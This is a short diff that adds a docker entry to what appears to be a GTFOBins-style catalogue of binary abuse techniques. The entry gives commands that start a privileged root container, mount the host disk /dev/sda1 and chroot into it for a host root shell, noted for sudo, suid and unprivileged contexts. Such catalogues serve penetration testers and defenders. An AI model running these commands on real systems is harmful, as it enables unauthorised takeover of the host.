@@ -31,4 +31,15 @@ functions:
       sudo:
       suid:
       unprivileged:
+  - code: |-
+      docker run --rm -it --privileged -u root alpine
+      mount /dev/sda1 /mnt/
+      ls -la /mnt/
+      chroot /mnt /bin/bash
+    comment: |-
+      This exploits the fact that is run with the `--privileged` option to directly mound an host's disk, e.g., `/dev/sda1`.
+    contexts:
+      sudo:
+      suid:
+      unprivileged:
 ...
